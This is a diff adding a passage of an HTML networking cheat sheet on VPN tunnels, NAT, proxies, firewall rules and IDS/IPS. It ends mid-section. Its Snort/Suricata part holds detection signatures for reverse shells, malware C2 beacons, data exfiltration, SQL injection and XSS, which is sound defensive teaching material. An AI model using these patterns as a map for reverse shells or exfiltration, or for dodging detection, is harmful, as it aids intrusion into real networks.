+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Device</span>
+            <span class="flow-arrow">→ ALL →</span>
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">VPN</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(247,118,142,0.15);color:#f7768e;">Internet</span>
+          </div>
+          <p style="font-size:0.68rem;text-align:center;color:#e0af68;margin:0.25rem 0;">Full Tunnel</p>
+          <div class="flow-diagram" style="margin-top:0.5rem;">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Device</span>
+            <span class="flow-arrow">→ corp →</span>
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">VPN</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(247,118,142,0.15);color:#f7768e;">Corp LAN</span>
+          </div>
+          <div class="flow-diagram" style="margin-top:0.25rem;">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Device</span>
+            <span class="flow-arrow">→ web →</span>
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Internet</span>
+            <span class="flow-arrow">(no VPN)</span>
+          </div>
+          <p style="font-size:0.68rem;text-align:center;color:#7aa2f7;margin:0.25rem 0;">Split Tunnel</p>
+          <br>
+          <table style="font-size:0.74rem;">
+            <tr><th>Aspect</th><th>Full Tunnel</th><th>Split Tunnel</th></tr>
+            <tr><td style="font-family:monospace;">Security</td><td>Higher</td><td>Lower</td></tr>
+            <tr><td style="font-family:monospace;">Bandwidth</td><td>All via VPN</td><td>Only corp via VPN</td></tr>
+            <tr><td style="font-family:monospace;">Latency</td><td>Higher for all</td><td>Normal for web</td></tr>
+            <tr><td style="font-family:monospace;">Use Case</td><td>High security</td><td>Remote work</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <!-- ══ NAT ═══════════════════════════════════════════════════════════ -->
+  <section id="nat">
+    <h2>NAT — Network Address Translation</h2>
+
+    <div class="block-desc">
+      <span>NAT translates private internal IP addresses to a public IP, allowing multiple devices to share one internet connection.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">nat types</div>
+        <pre><span class="c"># ── Static NAT (1-to-1) ──</span>
+Maps one private IP to one public IP permanently.
+Used for servers that need consistent public IPs.
+Example: 192.168.1.10 ↔ 203.0.113.10
+
+<span class="c"># ── Dynamic NAT ──</span>
+Maps private IPs to a pool of public IPs on demand.
+Runs out when pool is exhausted.
+Example: 192.168.1.x ↔ 203.0.113.{10-20}
+
+<span class="c"># ── PAT / NAPT (Port Address Translation) ──</span>
+Maps many private IPs to ONE public IP using ports.
+Also called "overloading" — most common type.
+Example: 192.168.1.10:443 → 203.0.113.10:54321
+         192.168.1.11:80  → 203.0.113.10:54322
+
+<span class="c"># ── NAT Traversal ──</span>
+UPnP  — auto port forwarding (home routers)
+STUN  — discovers public IP behind NAT
+TURN  — relay server when STUN fails
+ICE   — combines STUN + TURN for VoIP/WebRTC</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ How PAT works</div>
+        <div class="live-output">
+          <div class="flow-diagram">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">192.168.1.10:52001</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">NAT Router</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(122,162,247,0.15);color:#7aa2f7;">203.0.113.1:40001</span>
+          </div>
+          <br>
+          <table style="font-size:0.74rem;">
+            <tr><th>Type</th><th>Mapping</th><th>Scalability</th></tr>
+            <tr><td style="font-family:monospace;">Static NAT</td><td>1 private ↔ 1 public</td><td>Low (1:1)</td></tr>
+            <tr><td style="font-family:monospace;">Dynamic NAT</td><td>Many → pool of public</td><td>Medium (pool)</td></tr>
+            <tr><td style="font-family:monospace;">PAT (NAPT)</td><td>Many → 1 public + ports</td><td>High (65K ports)</td></tr>
+          </table>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>Private IP ranges:</strong><br>
+            <code>10.0.0.0/8</code> &nbsp; — Class A<br>
+            <code>172.16.0.0/12</code> — Class B<br>
+            <code>192.168.0.0/16</code> — Class C<br><br>
+            <strong>NAT limitation:</strong><br>
+            Breaks end-to-end connectivity.<br>
+            Complicates peer-to-peer &amp; VoIP.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="block-desc">
+      <span><strong>Port forwarding</strong> exposes an internal service to the internet; <strong>hairpin NAT</strong> lets LAN clients reach services via the public IP.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">port forwarding &amp; hairpin NAT</div>
+        <pre><span class="c"># ── Port Forwarding (iptables) ──</span>
+<span class="c"># Forward external port 8080 → internal 192.168.1.10:80</span>
+iptables -t nat -A PREROUTING -i eth0 \
+  -p tcp --dport 8080 -j DNAT \
+  --to-destination 192.168.1.10:80
+
+<span class="c"># Forward external 4433 → internal 192.168.1.20:443</span>
+iptables -t nat -A PREROUTING -i eth0 \
+  -p tcp --dport 4433 -j DNAT \
+  --to-destination 192.168.1.20:443
+
+<span class="c"># ── Hairpin NAT (NAT reflection) ──</span>
+<span class="c"># Allows LAN clients to access services via public IP</span>
+iptables -t nat -A POSTROUTING -o eth0 \
+  -s 192.168.1.0/24 -d 192.168.1.10 \
+  -p tcp --dport 80 -j MASQUERADE
+
+iptables -t nat -A PREROUTING -i eth0 \
+  -s 192.168.1.0/24 -d 203.0.113.1 \
+  -p tcp --dport 80 -j DNAT \
+  --to-destination 192.168.1.10:80
+
+<span class="c"># ── Nginx port forwarding (reverse proxy) ──</span>
+server {
+    listen 8080;
+    server_name public.example.com;
+    location / {
+        proxy_pass http://192.168.1.10:80;
+        proxy_set_header Host $host;
+    }
+}
+
+<span class="c"># ── CGNAT (Carrier-Grade NAT) ──</span>
+Used by ISPs when IPv4 addresses are exhausted.
+Multiple customers share one public IP.
+Range: 100.64.0.0/10 (100.64.0.0 – 100.127.255.255)
+Breaks port forwarding, VPN, VoIP, gaming.
+Solution: IPv6, CGNAT-aware protocols, DS-Lite.</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Port forwarding &amp; CGNAT</div>
+        <div class="live-output">
+          <div class="flow-diagram">
+            <span class="flow-node" style="background:rgba(247,118,142,0.15);color:#f7768e;">Internet</span>
+            <span class="flow-arrow">:8080→</span>
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">NAT Router</span>
+            <span class="flow-arrow">→:80</span>
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">192.168.1.10</span>
+          </div>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>Hairpin NAT use case:</strong><br>
+            LAN device accesses web server at public IP:80<br>
+            Router hairpins traffic back to internal IP<br>
+            Required for services that reference public URLs<br><br>
+            <strong>CGNAT architecture:</strong>
+          </p>
+          <div class="flow-diagram">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Cust A</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(122,162,247,0.15);color:#7aa2f7;">CGNAT</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">Public IP</span>
+          </div>
+          <div class="flow-diagram" style="margin-top:0.25rem;">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Cust B</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(122,162,247,0.15);color:#7aa2f7;">CGNAT</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">Same IP</span>
+          </div>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>CGNAT problems:</strong><br>
+            • Port forwarding breaks (double NAT)<br>
+            • P2P apps fail (torrents, gaming)<br>
+            • VPN may not establish<br>
+            • VoIP call quality degrades<br><br>
+            <strong>Workarounds:</strong><br>
+            • Use IPv6 (no NAT needed)<br>
+            • Request public IP from ISP<br>
+            • Use relay services (TURN for WebRTC)
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <!-- ══ PROXY ═════════════════════════════════════════════════════════ -->
+  <section id="proxy">
+    <h2>Proxy — Forward &amp; Reverse</h2>
+
+    <div class="block-desc">
+      <span>A proxy server sits between clients and servers, mediating requests for security, caching, or load balancing.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_httpmethods.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">proxy types</div>
+        <pre><span class="c"># ── Forward Proxy ──</span>
+Sits between CLIENTS and the internet.
+Client knows about proxy; server does not.
+Use cases: content filtering, anonymity, bypass geo-blocks.
+
+<span class="c"># ── Reverse Proxy ──</span>
+Sits between internet and BACKEND SERVERS.
+Server knows about proxy; clients do not.
+Use cases: load balancing, SSL termination, caching.
+
+<span class="c"># ── Proxy by Anonymity Level ──</span>
+Transparent  — sends original IP (no anonymity)
+Anonymous     — hides IP but reveals proxy use
+Elite/High    — hides IP &amp; proxy use entirely
+
+<span class="c"># ── Popular Reverse Proxies ──</span>
+Nginx        — high-perf web server + reverse proxy
+HAProxy      — TCP/HTTP load balancer
+Traefik      — cloud-native, auto service discovery
+Caddy        — automatic HTTPS, simple config
+Envoy        — service mesh, observability-first
+
+<span class="c"># ── Nginx reverse proxy config ──</span>
+upstream backend {
+    server 10.0.0.1:8080;
+    server 10.0.0.2:8080;
+}
+server {
+    listen 80;
+    location / {
+        proxy_pass http://backend;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+}</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Forward vs Reverse</div>
+        <div class="live-output">
+          <div class="flow-diagram">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Clients</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(122,162,247,0.15);color:#7aa2f7;">Forward Proxy</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">Internet</span>
+          </div>
+          <div class="flow-diagram" style="margin-top:0.5rem;">
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">Internet</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(187,154,247,0.15);color:#bb9af7;">Reverse Proxy</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Servers</span>
+          </div>
+          <br>
+          <table style="font-size:0.74rem;">
+            <tr><th>Aspect</th><th>Forward Proxy</th><th>Reverse Proxy</th></tr>
+            <tr><td style="font-family:monospace;">Who uses it</td><td>Client-side</td><td>Server-side</td></tr>
+            <tr><td style="font-family:monospace;">Knows about it</td><td>Client</td><td>Server</td></tr>
+            <tr><td style="font-family:monospace;">Purpose</td><td>Privacy, filtering</td><td>LB, caching, SSL</td></tr>
+            <tr><td style="font-family:monospace;">Examples</td><td>Squid, Privoxy</td><td>Nginx, HAProxy</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <div class="block-desc">
+      <span><strong>Transparent proxies</strong> intercept traffic without client config; <strong>SOCKS</strong> proxies handle any protocol; <strong>HTTP proxies</strong> work at Layer 7 only.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_httpmethods.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">proxy protocols &amp; reverse proxy LB</div>
+        <pre><span class="c"># ── Transparent Proxy ──</span>
+Intercepts traffic without client knowledge.
+Configured at router/gateway level (iptables REDIRECT).
+Used by ISPs for caching or filtering.
+Client settings: none required.
+
+<span class="c"># ── HTTP Proxy (Layer 7) ──</span>
+Handles HTTP/HTTPS CONNECT method only.
+Can inspect, cache, filter HTTP traffic.
+Protocols: HTTP, HTTPS (via CONNECT tunnel).
+curl -x http://proxy:8080 http://example.com
+curl -x http://proxy:8080 -p https://example.com
+
+<span class="c"># ── SOCKS Proxy (Layer 5) ──</span>
+SOCKS4: TCP only, no authentication.
+SOCKS5: TCP + UDP, auth, IPv6 support.
+Handles ANY protocol (not just HTTP).
+ssh -D 1080 user@server   <span class="c"># dynamic SOCKS proxy</span>
+ssh -D 1080 -N user@server <span class="c"># no shell, just proxy</span>
+curl --socks5 127.0.0.1:1080 http://example.com
+
+<span class="c"># ── Reverse Proxy Load Balancing ──</span>
+<span class="c"># Nginx upstream with multiple algorithms:</span>
+upstream app {
+    <span class="c"># least connections (best for varying req time)</span>
+    least_conn;
+    server 10.0.0.1:8080 weight=5;
+    server 10.0.0.2:8080 weight=3;
+    server 10.0.0.3:8080 backup;
+}
+<span class="c"># ip_hash (sticky sessions)</span>
+upstream app_hash {
+    ip_hash;
+    server 10.0.0.1:8080;
+    server 10.0.0.2:8080;
+}
+<span class="c"># random (chaos balancing)</span>
+upstream app_random {
+    random two least_conn;
+    server 10.0.0.1:8080;
+    server 10.0.0.2:8080;
+    server 10.0.0.3:8080;
+}</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Proxy protocol comparison</div>
+        <div class="live-output">
+          <table style="font-size:0.74rem;">
+            <tr><th>Type</th><th>Layer</th><th>Protocols</th><th>Inspection</th></tr>
+            <tr><td style="font-family:monospace;color:#9ece6a;">HTTP Proxy</td><td>L7</td><td>HTTP/HTTPS</td><td>Full HTTP</td></tr>
+            <tr><td style="font-family:monospace;color:#7aa2f7;">SOCKS5</td><td>L5</td><td>Any (TCP+UDP)</td><td>None</td></tr>
+            <tr><td style="font-family:monospace;color:#e0af68;">Transparent</td><td>L3-7</td><td>Any (redirected)</td><td>Configurable</td></tr>
+            <tr><td style="font-family:monospace;color:#bb9af7;">Reverse Proxy</td><td>L7</td><td>HTTP/HTTPS</td><td>Full HTTP</td></tr>
+          </table>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>Transparent proxy config (iptables):</strong><br>
+            <code>iptables -t nat -A PREROUTING<br>
+            -i eth0 -p tcp --dport 80<br>
+            -j REDIRECT --to-port 3128</code><br><br>
+            <strong>Anonymity levels:</strong><br>
+            <span style="color:#9ece6a;">● Transparent</span> — sends X-Forwarded-For (no privacy)<br>
+            <span style="color:#e0af68;">● Anonymous</span> — hides IP, reveals proxy use<br>
+            <span style="color:#7aa2f7;">● Elite</span> — hides IP + proxy use entirely
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <!-- ══ FIREWALLS ════════════════════════════════════════════════════ -->
+  <section id="firewall">
+    <h2>Firewalls</h2>
+
+    <div class="block-desc">
+      <span>Firewalls control network traffic by enforcing rules — filtering packets, tracking state, or inspecting application content.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">firewall types &amp; examples</div>
+        <pre><span class="c"># ── Packet Filtering (Stateless) ──</span>
+Checks each packet in isolation (src/dst IP, port).
+Fast but no context — can't track connections.
+Example: basic iptables or router ACLs.
+
+<span class="c"># ── Stateful Inspection ──</span>
+Tracks connection state (NEW, ESTABLISHED, RELATED).
+Blocks unsolicited incoming traffic.
+Most modern firewalls are stateful by default.
+
+<span class="c"># ── Application / Proxy Firewall ──</span>
+Inspects Layer 7 content (HTTP headers, payloads).
+Can block specific URLs, methods, or content types.
+Slower but much more granular control.
+
+<span class="c"># ── NGFW (Next-Gen Firewall) ──</span>
+Combines stateful + application inspection + IPS.
+Adds threat intelligence, SSL decryption, sandboxing.
+Examples: Palo Alto, FortiGate, Cisco Firepower.
+
+<span class="c"># ── WAF (Web Application Firewall) ──</span>
+Specifically protects web apps (OWASP Top 10).
+Filters HTTP/HTTPS traffic by rules &amp; signatures.
+See dedicated WAF section below.</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Firewall comparison</div>
+        <div class="live-output">
+          <table style="font-size:0.74rem;">
+            <tr><th>Type</th><th>Layer</th><th>Speed</th><th>Granularity</th></tr>
+            <tr><td style="font-family:monospace;">Packet Filter</td><td>L3/L4</td><td>★★★★★</td><td>★★☆☆☆</td></tr>
+            <tr><td style="font-family:monospace;">Stateful</td><td>L3/L4</td><td>★★★★☆</td><td>★★★☆☆</td></tr>
+            <tr><td style="font-family:monospace;">Proxy/App</td><td>L7</td><td>★★★☆☆</td><td>★★★★☆</td></tr>
+            <tr><td style="font-family:monospace;">NGFW</td><td>L3-L7</td><td>★★★☆☆</td><td>★★★★★</td></tr>
+            <tr><td style="font-family:monospace;">WAF</td><td>L7 (HTTP)</td><td>★★★☆☆</td><td>★★★★★</td></tr>
+          </table>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>Defense in depth:</strong><br>
+            Use packet filter (router) + stateful (host) + NGFW (perimeter) + WAF (web apps).
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="block-desc">
+      <span>iptables / nftables rule examples — the most common Linux firewall configuration.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">iptables / nftables rules</div>
+        <pre><span class="c"># ── iptables: Allow established connections ──</span>
+iptables -A INPUT -m conntrack \
+  --ctstate ESTABLISHED,RELATED -j ACCEPT
+
+<span class="c"># ── iptables: Allow SSH (port 22) ──</span>
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+
+<span class="c"># ── iptables: Allow HTTP/HTTPS ──</span>
+iptables -A INPUT -p tcp \
+  --dport 80,443 -j ACCEPT
+
+<span class="c"># ── iptables: Block all other input ──</span>
+iptables -A INPUT -j DROP
+
+<span class="c"># ── iptables: NAT / port forwarding ──</span>
+iptables -t nat -A PREROUTING -p tcp \
+  --dport 8080 -j DNAT \
+  --to-destination 192.168.1.10:80
+iptables -t nat -A POSTROUTING \
+  -o eth0 -j MASQUERADE
+
+<span class="c"># ── nftables: modern equivalent ──</span>
+nft add rule inet filter input \
+  ct state established,related accept
+nft add rule inet filter input \
+  tcp dport {22,80,443} accept
+nft add rule inet filter input drop</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Rule processing order</div>
+        <div class="live-output" style="font-size:0.75rem;color:var(--text-muted);line-height:1.9;">
+          <p><strong>iptables chain flow:</strong></p>
+          <p><code>1. PREROUTING</code> — incoming, before routing</p>
+          <p><code>2. INPUT</code> — packets to this host</p>
+          <p><code>3. FORWARD</code> — packets routed through</p>
+          <p><code>4. OUTPUT</code> — outgoing from this host</p>
+          <p><code>5. POSTROUTING</code> — after routing, NAT</p>
+          <br>
+          <p><strong>Best practices:</strong></p>
+          <p>• Default policy: <code>DROP</code> (deny all)</p>
+          <p>• Whitelist only what you need</p>
+          <p>• Allow established/related first</p>
+          <p>• Log dropped packets for debugging</p>
+          <p>• Use <code>fail2ban</code> for brute-force</p>
+          <p>• Test rules with <code>-L -v -n</code></p>
+        </div>
+      </div>
+    </div>
+
+    <div class="block-desc">
+      <span><strong>Stateful firewalls</strong> track connection state for smarter decisions; a <strong>DMZ</strong> isolates public-facing services from the internal network.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">stateful vs stateless &amp; DMZ</div>
+        <pre><span class="c"># ── Stateless Firewall ──</span>
+Examines each packet in isolation.
+No memory of previous packets.
+Rules: src IP, dst IP, port, protocol.
+Fast but easily spoofed (no state tracking).
+
+<span class="c"># ── Stateful Firewall ──</span>
+Tracks connection state in a state table.
+States: NEW, ESTABLISHED, RELATED, INVALID
+NEW — first packet of a connection
+ESTABLISHED — part of existing connection
+RELATED — related to existing (FTP data)
+INVALID — doesn't match any known state
+Blocks unsolicited inbound automatically.
+
+<span class="c"># ── Connection Tracking Table ──</span>
+conntrack -L          <span class="c"># list all connections</span>
+conntrack -L -p tcp   <span class="c"># filter by protocol</span>
+conntrack -C          <span class="c"># count entries</span>
+sysctl net.netfilter.nf_conntrack_max
+
+<span class="c"># ── DMZ Architecture ──</span>
+Three-zone model:
+  Zone 1: Internal LAN (trusted)
+  Zone 2: DMZ (semi-trusted, public services)
+  Zone 3: Internet (untrusted)
+
+Firewall rules:
+  Internet → DMZ: allow HTTP/HTTPS only
+  DMZ → Internet: allow outbound (responses)
+  Internet → LAN: BLOCK everything
+  LAN → DMZ: allow management (SSH, etc.)
+  DMZ → LAN: BLOCK (isolation)
+
+<span class="c"># ── UFW (Ubuntu Firewall) ──</span>
+ufw status verbose         <span class="c"># show status</span>
+ufw enable                 <span class="c"># activate firewall</span>
+ufw default deny incoming  <span class="c"># deny all inbound</span>
+ufw default allow outgoing <span class="c"># allow all outbound</span>
+ufw allow 22/tcp           <span class="c"># allow SSH</span>
+ufw allow 80,443/tcp       <span class="c"># allow web</span>
+ufw allow from 192.168.1.0/24  <span class="c"># allow subnet</span>
+ufw deny from 10.0.0.5     <span class="c"># block specific IP</span>
+ufw logging on             <span class="c"># enable logging</span>
+ufw delete allow 80/tcp    <span class="c"># remove rule</span>
+
+<span class="c"># ── nftables: full firewall script ──</span>
+#!/usr/sbin/nft -f
+flush ruleset
+
+table inet filter {
+    chain input {
+        type filter hook input priority 0; policy drop;
+
+        <span class="c"># Allow loopback</span>
+        iif "lo" accept
+        <span class="c"># Allow established/related</span>
+        ct state established,related accept
+        <span class="c"># Allow SSH, HTTP, HTTPS</span>
+        tcp dport {22,80,443} accept
+        <span class="c"># Log and drop everything else</span>
+        counter log prefix "DROPPED: " drop
+    }
+    chain forward {
+        type filter hook forward priority 0; policy drop;
+        ct state established,related accept
+    }
+    chain output {
+        type filter hook output priority 0; policy accept;
+    }
+}</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Stateful tracking &amp; DMZ</div>
+        <div class="live-output">
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.9;">
+            <strong>State table example:</strong>
+          </p>
+          <table style="font-size:0.72rem;">
+            <tr><th>Proto</th><th>Source</th><th>Destination</th><th>State</th></tr>
+            <tr><td style="font-family:monospace;">TCP</td><td>192.168.1.5:44221</td><td>93.184.216.34:443</td><td style="color:#9ece6a;">ESTAB</td></tr>
+            <tr><td style="font-family:monospace;">TCP</td><td>45.33.12.8:55102</td><td>192.168.1.10:80</td><td style="color:#7aa2f7;">NEW</td></tr>
+            <tr><td style="font-family:monospace;">TCP</td><td>10.0.0.99:22</td><td>192.168.1.5:52001</td><td style="color:#e0af68;">RELATED</td></tr>
+            <tr><td style="font-family:monospace;">TCP</td><td>??? . . . :0</td><td>192.168.1.10:3389</td><td style="color:#f7768e;">INVALID</td></tr>
+          </table>
+          <br>
+          <div class="flow-diagram">
+            <span class="flow-node" style="background:rgba(247,118,142,0.15);color:#f7768e;">Internet</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">DMZ</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(122,162,247,0.15);color:#7aa2f7;">Firewall</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">LAN</span>
+          </div>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>DMZ best practices:</strong><br>
+            • Place web servers, mail, DNS in DMZ<br>
+            • Block DMZ → LAN entirely<br>
+            • Only allow LAN → DMZ for management<br>
+            • Use separate firewall interfaces for each zone<br><br>
+            <strong>UFW shortcuts:</strong><br>
+            <code>ufw app list</code> — see app profiles<br>
+            <code>ufw allow "OpenSSH"</code> — by profile name<br>
+            <code>ufw rate limit 22/tcp</code> — rate limit SSH
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <!-- ══ IDS / IPS ════════════════════════════════════════════════════ -->
+  <section id="ids-ips">
+    <h2>IDS / IPS — Intrusion Detection &amp; Prevention</h2>
+
+    <div class="block-desc">
+      <span>IDS monitors traffic and alerts on suspicious activity; IPS sits inline and actively blocks threats.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">ids vs ips</div>
+        <pre><span class="c"># ── IDS (Intrusion Detection System) ──</span>
+Monitors traffic copy (tap/mirror port).
+Generates alerts but does NOT block traffic.
+Passive — out-of-band deployment.
+Good for: monitoring, forensics, compliance.
+
+<span class="c"># ── IPS (Intrusion Prevention System) ──</span>
+Sits inline with traffic flow (transparent bridge).
+Detects AND blocks malicious traffic in real-time.
+Active — inline deployment with risk of false positives.
+Good for: automated protection, real-time defense.
+
+<span class="c"># ── Detection Methods ──</span>
+Signature-based   — matches known attack patterns
+                   Fast, low false positives
+                   Cannot detect zero-day attacks
+
+Anomaly-based     — builds baseline of normal traffic
+                   Flags deviations from baseline
+                   Higher false positive rate
+
+Heuristic/Policy  — uses rules &amp; behavioral analysis
+                   Catches variants of known attacks
+                   Requires expert-tuned rule sets
+
+<span class="c"># ── Popular Tools ──</span>
+Snort        — open-source IDS/IPS (signature)
+Suricata     — multi-threaded IDS/IPS (signature+anomaly)
+Zeek (Bro)   — network analysis framework
+OSSEC        — host-based IDS (HIDS)
+Wazuh        — extended OSSEC with SIEM integration</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ IDS vs IPS comparison</div>
+        <div class="live-output">
+          <div class="flow-diagram">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Traffic</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(122,162,247,0.15);color:#7aa2f7;">Mirror/Tap</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">IDS (Alert)</span>
+          </div>
+          <div class="flow-diagram" style="margin-top:0.5rem;">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Traffic</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(247,118,142,0.15);color:#f7768e;">IPS (Inline)</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Clean Traffic</span>
+          </div>
+          <br>
+          <table style="font-size:0.74rem;">
+            <tr><th>Aspect</th><th>IDS</th><th>IPS</th></tr>
+            <tr><td style="font-family:monospace;">Mode</td><td>Passive (out-of-band)</td><td>Active (inline)</td></tr>
+            <tr><td style="font-family:monospace;">Response</td><td>Alert only</td><td>Alert + Block</td></tr>
+            <tr><td style="font-family:monospace;">Risk</td><td>None (no impact)</td><td>False positives drop legit traffic</td></tr>
+            <tr><td style="font-family:monospace;">Deployment</td><td>Tap/mirror port</td><td>Transparent bridge</td></tr>
+            <tr><td style="font-family:monospace;">Latency</td><td>Zero</td><td>Small (packet inspection)</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <div class="block-desc">
+      <span><strong>Snort</strong> and <strong>Suricata</strong> rules define signatures to detect attacks; tuning reduces false positives in production.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">snort &amp; suricata rules</div>
+        <pre><span class="c"># ── Snort Rule Syntax ──</span>
+action protocol src_ip src_port → dst_ip dst_port (options)
+
+<span class="c"># Example: detect SQL injection attempt</span>
+alert http $HOME_NET any -> $EXTERNAL_NET any (
+    msg:"SQL Injection - UNION SELECT";
+    flow:established,to_server;
+    content:"UNION"; nocase;
+    content:"SELECT"; nocase;
+    sid:1000001; rev:1;
+    classtype:web-application-attack;
+)
+
+<span class="c"># Example: detect reverse shell</span>
+alert tcp $HOME_NET any -> $EXTERNAL_NET any (
+    msg:"Possible Reverse Shell - /bin/sh";
+    flow:established,to_server;
+    content:"/bin/sh"; nocase;
+    sid:1000002; rev:1;
+    priority:1;
+)
+
+<span class="c"># ── Suricata Rule Syntax ──</span>
+<span class="c"># Similar to Snort, with added features:</span>
+alert http $HOME_NET any -> $EXTERNAL_NET any (
+    msg:"XSS Attack Detected";
+    flow:established,to_server;
+    content:"<script>"; nocase;
+    http_uri; pcre:"/<script[^>]*>/i";
+    sid:2000001; rev:1;
+    metadata:severity attack, attack_target Web_Server;
+    reference:cve,2023-XXXX;
+)
+
+<span class="c"># ── Suricata flowbit (correlation) ──</span>
+alert http any any -> any any (
+    msg:"Malware C2 Detected";
+    flow:established,to_server;
+    content:"POST"; http_method;
+    content:"/gate.php"; http_uri;
+    flowbits:set,malware_c2;
+    sid:3000001;
+)
+alert http any any -> any any (
+    msg:"C2 - Data Exfiltration";
+    flow:established,to_server;
+    content:"POST"; http_method;
+    flowbits:isset,malware_c2;
+    content:"Content-Length"; http_header;
+    byte_test:5,>,1000000,0,string,dec;
+    sid:3000002;
+)
+
+<span class="c"># ── Rule Keywords ──</span>
